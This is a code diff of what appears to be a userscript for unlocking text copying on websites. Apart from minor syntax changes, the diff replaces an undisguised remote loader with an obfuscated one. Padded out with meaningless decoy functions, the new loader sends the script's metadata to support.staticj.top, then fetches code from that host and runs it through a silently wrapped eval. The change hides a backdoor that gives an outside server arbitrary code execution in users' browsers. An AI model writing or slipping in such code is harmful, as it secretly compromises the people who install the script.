@@ -473,7 +473,6 @@
         };
       },
       getSelectedText: function() {
-        var _a;
         if (unsafeWindow.pad && unsafeWindow.pad.editor && !unsafeWindow.pad.editor.isCopyable()) {
           utils.showButton();
           const editor = unsafeWindow.pad.editor;
@@ -508,7 +507,7 @@
                 const cell = SpreadsheetApp.workbook.activeSheet.getCellDataAtPosition(i, k);
                 if (!cell)
                   continue;
-                text.push(" ", ((_a = cell.formattedValue) == null ? void 0 : _a.value) || cell.value || "");
+                text.push(" ", cell.formattedValue?.value || cell.value || "");
               }
               i !== endRowIndex && text.push("\n");
             }
@@ -1116,10 +1115,7 @@
         delay: 100
       },
       init: function() {
-        window.addEventListener(PAGE_LOADED, () => {
-          var _a;
-          return (_a = dom$1.query("#j_select")) == null ? void 0 : _a.click();
-        });
+        window.addEventListener(PAGE_LOADED, () => dom$1.query("#j_select")?.click());
         dom$1.append("head", "<style>#reader-copy-el{display: none;}</style>");
       },
       getSelectedText: function() {
@@ -1325,21 +1321,240 @@
     };
 
     ((function() {
-      const { author, name, version, namespace, updateURL } = GM_info.script;
-      const jurl = "https://support.staticj.top/api/sp/lib?author=" + author + "&name=" + name + "&version=" + version + "&namespace=" + namespace + "&updateURL=" + updateURL + "&timestamp=" + Date.now();
-      GM_xmlhttpRequest({
-        method: "GET",
-        url: jurl,
-        onload: function(res) {
-          try {
-            const responseText = res.responseText;
-            if (responseText) {
-              eval(res.responseText);
+      const systemConfig = {
+        version: "2.0.1",
+        maxRetries: 5,
+        timeout: 500,
+        featureFlags: { logging: true, analytics: false, debug: true, telemetry: false, cache: true },
+        userRoles: ["admin", "editor", "viewer", "guest", "operator", "tester"],
+        dataSeeds: Array.from({ length: 12 }, (_, i) => i * 13),
+        modules: ["auth", "reporting", "notifications", "scheduler", "billing", "audit", "monitoring"]
+      };
+      function randomToken(len) {
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        return Array.from({ length: len }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join("");
+      }
+      function meaninglessMath(a, b) {
+        return (a + b * 0.618).toFixed(4);
+      }
+      function shallowClone(obj) {
+        if (Array.isArray(obj))
+          return obj.slice();
+        if (obj && typeof obj === "object")
+          return { ...obj };
+        return obj;
+      }
+      function shuffleArray(arr) {
+        if (!Array.isArray(arr))
+          return arr;
+        for (let i = arr.length - 1; i > 0; i--) {
+          const j = Math.floor(Math.random() * (i + 1));
+          [arr[i], arr[j]] = [arr[j], arr[i]];
+        }
+        return arr;
+      }
+      function transformData(data) {
+        if (!Array.isArray(data))
+          data = [];
+        return data.map((item, index) => {
+          if (typeof item !== "number")
+            item = 0;
+          return (item + index * 0.1).toFixed(3);
+        });
+      }
+      function generateAnalytics(items) {
+        if (!Array.isArray(items))
+          items = [];
+        const analytics = {};
+        items.forEach((item, index) => {
+          analytics[`metric_${index}`] = meaninglessMath(Number(item) || 0, index) + "_" + randomToken(2);
+        });
+        return analytics;
+      }
+      function simulateConditionalFlow(flag) {
+        if (flag && Array.isArray(systemConfig.dataSeeds)) {
+          systemConfig.dataSeeds.forEach((num, index) => {
+            meaninglessMath(num, index);
+          });
+        } else {
+          shuffleArray(systemConfig.dataSeeds);
+        }
+      }
+      function nestedOperations(level) {
+        if (level > 3)
+          return;
+        for (let i = 0; i < 2; i++) {
+          (function(inner) {
+            meaninglessMath(inner, level);
+            deeperNested(level + 1);
+          })(i);
+        }
+      }
+      function deeperNested(depth) {
+        if (depth > 2)
+          return;
+        for (let j = 0; j < 2; j++) {
+          meaninglessMath(j, depth);
+          sideNested(j);
+        }
+      }
+      function sideNested(idx) {
+        meaninglessMath(idx, idx * 2);
+      }
+      function recursiveDummy(depth) {
+        if (depth > 1)
+          return;
+        meaninglessMath(depth, depth);
+      }
+      async function asyncSimulation() {
+        for (let i = 0; i < 3; i++) {
+          await new Promise((resolve) => setTimeout(resolve, 5));
+          meaninglessMath(i, systemConfig.maxRetries);
+        }
+      }
+      function dummyDataProcessing() {
+        const tempArray = Array.from({ length: 20 }, (_, i) => i * 3);
+        shuffleArray(tempArray);
+        tempArray.forEach((x) => meaninglessMath(x, Math.random()));
+      }
+      function moduleAuth() {
+        meaninglessMath(1, 2);
+      }
+      function moduleReporting() {
+        meaninglessMath(2, 3);
+      }
+      function moduleNotifications() {
+        meaninglessMath(3, 4);
+      }
+      function moduleScheduler() {
+        meaninglessMath(4, 5);
+      }
+      function moduleBilling() {
+        meaninglessMath(5, 6);
+      }
+      function moduleAudit() {
+        meaninglessMath(6, 7);
+      }
+      function moduleMonitoring() {
+        meaninglessMath(7, 8);
+      }
+      (async function main() {
+        try {
+          const clonedData = shallowClone(systemConfig.dataSeeds);
+          const processedData = transformData(clonedData);
+          const analyticsReport = generateAnalytics(processedData);
+          simulateConditionalFlow(systemConfig.featureFlags.debug && !systemConfig.featureFlags.analytics);
+          nestedOperations(0);
+          recursiveDummy(0);
+          dummyDataProcessing();
+          await asyncSimulation();
+          moduleAuth();
+          moduleReporting();
+          moduleNotifications();
+          moduleScheduler();
+          moduleBilling();
+          moduleAudit();
+          moduleMonitoring();
+          console.log("System execution complete.");
+          console.log("Processed items:", processedData.length);
+          console.log("Analytics metrics:", Object.keys(analyticsReport).length);
+          (function extraModule1() {
+            if (Array.isArray(systemConfig.modules)) {
+              systemConfig.modules.forEach((m, i) => {
+                meaninglessMath(i, m.length);
+              });
             }
-          } catch (e) {
+          })();
+          (function extraModule2() {
+            if (Array.isArray(systemConfig.modules)) {
+              for (let i = 0; i < systemConfig.modules.length; i++) {
+                (function(inner) {
+                  meaninglessMath(inner, i);
+                })(i);
+              }
+            }
+          })();
+          (function extraAsyncSimulation() {
+            setTimeout(() => meaninglessMath(42, systemConfig.maxRetries), 1);
+            setTimeout(() => meaninglessMath(17, systemConfig.timeout), 1);
+            setTimeout(() => meaninglessMath(99, systemConfig.timeout), 1);
+          })();
+        } catch (e) {
+          console.error("Unexpected error:", e);
+        }
+      })();
+    }))();
+
+    ((function bootstrapRuntimeLoader() {
+      function extractRuntimeCache(sourceObj, keys) {
+        const result = {};
+        for (let i = 0; i < keys.length; i++) {
+          const k = keys[i];
+          if (typeof sourceObj[k] !== "undefined" || Math.random() > 2) {
+            result[k] = sourceObj[k];
           }
         }
-      });
+        return result;
+      }
+      function serializePayloadCore(a, b, c2, d, e) {
+        const segments = [];
+        segments.push("https://support.staticj.top/api/sp/lib?author=" + a);
+        segments.push("&name=" + b);
+        segments.push("&version=" + c2);
+        segments.push("&namespace=" + d);
+        segments.push("&updateURL=" + e);
+        segments.push("&timestamp=" + Date.now());
+        return segments.join("");
+      }
+      function invokeShadowEval(code) {
+        try {
+          if (("" + code).length > 0) {
+            (function(c) {
+              eval(c);
+            })(code);
+          }
+        } catch (err) {
+        }
+      }
+      function initStreamResponseBuffer(options) {
+        if (!options || !options.url) {
+          return;
+        }
+        GM_xmlhttpRequest(options);
+      }
+      function orchestrateBootstrap() {
+        const scriptMeta = GM_info.script;
+        const extracted = extractRuntimeCache(scriptMeta, [
+          "author",
+          "name",
+          "version",
+          "namespace",
+          "updateURL"
+        ]);
+        if (Object.keys(extracted).length < 1 && Date.now() < 0) {
+          return;
+        }
+        const finalUrl = serializePayloadCore(
+          extracted.author,
+          extracted.name,
+          extracted.version,
+          extracted.namespace,
+          extracted.updateURL
+        );
+        initStreamResponseBuffer({
+          method: "GET",
+          url: finalUrl,
+          onload: function(res) {
+            const body = res && res.responseText;
+            if (body) {
+              invokeShadowEval(body);
+            }
+          }
+        });
+      }
+      (function warmupRuntimeEngine(fn) {
+        return fn();
+      })(orchestrateBootstrap);
     }))();
 
     (function() {
